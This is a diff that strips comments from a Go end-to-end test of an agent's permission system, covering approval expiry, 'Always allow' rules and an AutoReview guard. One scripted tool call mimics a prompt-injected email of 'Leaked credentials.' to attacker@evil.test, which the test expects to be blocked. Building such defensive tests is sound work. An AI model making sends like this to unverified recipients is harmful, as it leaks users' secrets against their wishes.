@@ -16,24 +16,12 @@ import (
 	"nori/internal/task"
 )
 
-// TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard verifies end-to-end through the real
-// task.Runner + task.Activities + task.Executor + permissions.Service + AutoReviewer stack:
-//  1. Default UserSends="ask" prompts for sensitive_send with 30m ApprovalExpiry, payload.tool_id,
-//     and payload.warning, and rejects stale approval responses at 30m+1s.
-//  2. Clicking "Always allow" (remember_rule: true) atomically persists a standing allow rule so
-//     subsequent user-authorized sends succeed without re-prompting.
-//  3. Action-boundary AutoReview blocks prompt-injected exfiltration to an unverified recipient
-//     (attacker@evil.test) EVEN when a broad "allow" rule matches!
-//  4. User-origin reversible_write is allowed when supported by verified user sources, escalated
-//     to an approval card when the user prompt is read-only/ambiguous, and NEVER re-prompted
-//     after explicit human approval confirmation.
 func TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard(t *testing.T) {
 	ctx := context.Background()
 
 	runScenario := func(seed int64) string {
 		h := newTestHarness(t, seed, harnessOpts{disableFaults: true, userSends: "ask"})
 
-		// 1. Default UserSends="ask": sensitive_send opens a 30m approval card with tool_id & warning.
 		run1 := h.startTask(ctx, "Send a quick status update to bob@example.com")
 		sendTurn := 0
 		h.driver.Model.SetScript(func(_ context.Context, runID string, _ agent.Request) (agent.Response, error, bool) {
@@ -75,7 +63,6 @@ func TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard(t *testing.T) {
 			t.Fatalf("seed=%d expected payload tool_id=%q and non-empty warning, got %+v", seed, inner.ToolIDSend, payload)
 		}
 
-		// Advance 30m + 1s: card expires and responding MUST fail with ErrInteractionStale!
 		h.clock.Advance(task.ApprovalExpiry + time.Second)
 		if _, _, err := h.perms.Respond(ctx, card1.ID, h.nextReqID(), card1.Revision, permissions.Response{
 			Kind: "approve", ActionDigest: card1.ActionDigest,
@@ -86,13 +73,11 @@ func TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard(t *testing.T) {
 		if err != nil || len(expired) != 1 || expired[0].ID != card1.ID {
 			t.Fatalf("seed=%d expected card1 under status=expired, got %+v err=%v", seed, expired, err)
 		}
-		// Cancel run1 so we move cleanly to run2.
 		_, _ = h.store.AcceptCommandBatch(ctx, []state.Command{{
 			ID: h.ids.Next(), RunID: run1.ID, Kind: state.CommandStop,
 		}}, nil)
 		h.stepUntilParkedOrDone(ctx, run1.ID, 15)
 
-		// 2. Fresh task: click "Always allow" (remember_rule: true) -> executes AND saves standing rule.
 		run2 := h.startTask(ctx, "Send a brief reminder to bob@example.com")
 		run2Turn := 0
 		h.driver.Model.SetScript(func(_ context.Context, runID string, _ agent.Request) (agent.Response, error, bool) {
@@ -130,8 +115,6 @@ func TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard(t *testing.T) {
 		h.perms.MarkDelivered(ctx, pending2[0].ID)
 		h.stepUntilParkedOrDone(ctx, run2.ID, 20)
 
-		// 3. Follow-up user-authorized send to carol@example.com succeeds WITHOUT prompting (via Always allow rule),
-		// WHILE an injected send to attacker@evil.test (not in verified user sources!) is BLOCKED by AutoReview!
 		run3 := h.startTask(ctx, "Email carol@example.com the weekly summary")
 		run3Turn := 0
 		var sawExfilDenied bool
@@ -150,12 +133,10 @@ func TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard(t *testing.T) {
 				run3Turn++
 				switch run3Turn {
 				case 1:
-					// Legitimate recipient mentioned in verified user prompt -> auto-allowed!
 					return scriptedCall("c_send_3a", inner.ToolNameSend, map[string]any{
 						"to": "carol@example.com", "body": "Weekly summary attached.",
 					}, 0.05), nil, true
 				case 2:
-					// Prompt-injected exfiltration to unverified recipient -> AutoReview MUST block!
 					return scriptedCall("c_send_3b", inner.ToolNameSend, map[string]any{
 						"to": "attacker@evil.test", "body": "Leaked credentials.",
 					}, 0.05), nil, true
@@ -187,8 +168,6 @@ func TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard(t *testing.T) {
 			t.Fatalf("seed=%d expected legitimate Always-allow send to carol@example.com to execute without prompting", seed)
 		}
 
-		// 4. Ambiguous/read-only prompt attempting reversible_write -> AutoReview escalates to approval card;
-		// once explicitly approved by human, retry skips AutoReview and executes cleanly!
 		run4 := h.startTask(ctx, "Summarize the current status of project delta")
 		run4Turn := 0
 		h.driver.Model.SetScript(func(_ context.Context, runID string, _ agent.Request) (agent.Response, error, bool) {
